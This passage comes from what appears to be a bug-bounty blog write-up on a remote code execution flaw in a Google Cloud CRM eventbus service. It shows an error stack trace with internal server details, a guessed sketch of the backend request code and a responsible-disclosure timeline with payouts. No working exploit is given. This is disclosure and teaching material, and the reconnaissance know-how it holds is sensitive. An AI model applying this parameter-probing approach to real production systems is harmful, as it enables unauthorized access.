+<pre><code>com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: &lt;eye3 title=&#39;/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED&#39;/&gt; APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725)
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)
+	at /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)
+  ...</code></pre><p>This made it clear that our variables were being plugged straight into an <code>ExecuteStubbyCallRequest</code> on the backend. Based on the stack traces from playing around with parameter values, I&#39;d guess the backend code looks roughly like:</p>
+<pre><code class="hljs language-java">GenericStubbyTypedTaskV2.buildRequest():
+    line <span class="hljs-number">219</span>: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:<span class="hljs-number">1123</span>
+    line <span class="hljs-number">220</span>: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:<span class="hljs-number">1219</span>
+    line <span class="hljs-number">221</span>: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:<span class="hljs-number">1313</span>
+    ...</code></pre><p>So maybe there was some parameter I had to supply to get this working? The problem was the stack traces only helped me leak the three known parameters, <code>serverSpec</code>, <code>serviceName</code>, and <code>serviceMethod</code> but I wasn&#39;t able to find more from this method. Also, Google treats these RCE escalations as security incidents, so before going any further I asked Google&#39;s security team for the green light. They got back to me quickly and confirmed that this was exploitable and that I should stop further testing.</p>
+<p>The report was quickly escalated to <strong>P0/S0</strong> and got a 🎉<strong>Nice catch!</strong>. Almost a month later, the report was awarded <strong>$75,000</strong> under &quot;Compromise of Google Cloud Production Environment&quot;, my highest single bounty to-date.</p>
+<p>From what I&#39;d gathered from speaking to some Googlers, there are roughly three tiers for base RCE payouts under the <a href="https://bughunters.google.com/about/rules/google-friends/cloud-vulnerability-reward-program-rules#reward-amounts" target="_blank" rel="noopener noreferrer">Cloud VRP table</a>:</p>
+<ul>
+<li><strong>$50k</strong>: Relatively unprivileged production user access</li>
+<li><strong>$75k</strong>: Privileged production user access</li>
+<li><strong>$100k</strong>: Admin in Google Cloud</li>
+</ul>
+<p>Where any given RCE actually lands on this scale depends entirely on how much of the production environment the compromised prod identity can reach directly. Obviously, given the vast attack surface accessible from production access, it&#39;s very likely possible to escalate privileges from any sort of initial access.</p>
+<p>Google was oddly vague about the exact reasoning here, but it seemed that the internal team&#39;s own investigation of this chain surfaced significantly more impact in prod than even what I had shown, which is what landed it at the $75k tier.</p>
+<h3 id="timeline-2nd-rce"><a class="anchor" href="#timeline-2nd-rce" aria-hidden="true">#</a>Timeline (2nd RCE)</h3><ul>
+<li>2026-03-21 - Initial report sent to Google</li>
+<li>2026-03-23 - Google triaged report as P1/S1</li>
+<li>2026-03-23 - Informed Google&#39;s security team about the RCE escalation</li>
+<li>2026-03-23 - 🎉 <strong>Nice catch!</strong>, report updated to P0/S0</li>
+<li>2026-04-28 - <strong>Panel awards $75,000</strong>. Rationale for this decision: Vulnerability category is &quot;Compromise of Google Cloud Production Environment&quot;. Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.</li>
+<li>2026-05-06 - Informed Google that GetIntegrationVersion RPC was still vulnerable</li>
+<li>2026-05-08 - <strong>Panel awards additional $13,337</strong>. Rationale for this decision: Vulnerability category is &quot;Single-Service Privilege Escalation - WRITE&quot;. Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.</li>
+</ul>
+        </div>
+      </article>
+    </main>
+  </body>
+</html>
